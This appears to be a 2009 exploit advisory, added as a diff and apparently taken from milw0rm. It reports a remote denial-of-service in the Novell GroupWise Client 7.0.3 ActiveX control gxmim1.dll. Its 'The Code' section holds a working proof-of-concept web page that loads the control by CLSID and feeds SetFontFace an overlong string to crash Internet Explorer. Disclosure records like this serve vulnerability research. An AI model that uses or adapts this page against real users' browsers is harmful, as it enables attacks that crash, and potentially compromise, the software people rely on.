@@ -1,0 +1,75 @@
+#####################################################################################
+
+Application:  Novell Groupwise Client 7.0.3.1294
+            
+Platforms:    Windows XP Professional French SP2 and SP3
+
+crash:	      IE 6.0.2900.2180
+	
+Exploitation: remote DoS
+
+Date:         2009-08-24
+
+Author:       Francis Provencher (Protek Research Lab's)
+             
+
+#####################################################################################
+
+1) Introduction
+2) Technical details and bug
+3) The Code
+
+#####################################################################################
+
+===============
+1) Introduction
+===============
+
+GroupWise is a messaging and collaborative software platform from Novell that supports email, calendaring, personal information management, instant messaging, and document management. The platform consists of the client software, which is available for Windows, Mac OS X, and Linux, and the server software, which is supported on Windows Server, Netware, and Linux. The latest generation of the platform is GroupWise 8, which was launched in 2008.
+
+#####################################################################################
+
+============================
+2) Technical details 
+============================
+
+Name:	gxmim1.dll
+Ver.:	7.0.3.1294
+CLSID:	{9796BED2-C1CF-11D2-9384-0008C7396667}
+
+
+
+
+#####################################################################################
+
+===========
+3) The Code
+===========
+
+Proof of concept DoS code;
+
+
+<html>
+<object classid='clsid:9796BED2-C1CF-11D2-9384-0008C7396667' id='GWComposeCtl'></object>
+
+
+<script language='vbscript'>
+
+
+
+
+argCount   = 1
+
+
+arg1="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+GWComposeCtl.SetFontFace arg1
+
+</script>
+
+
+
+
+#####################################################################################
+
+# milw0rm.com [2009-09-15]
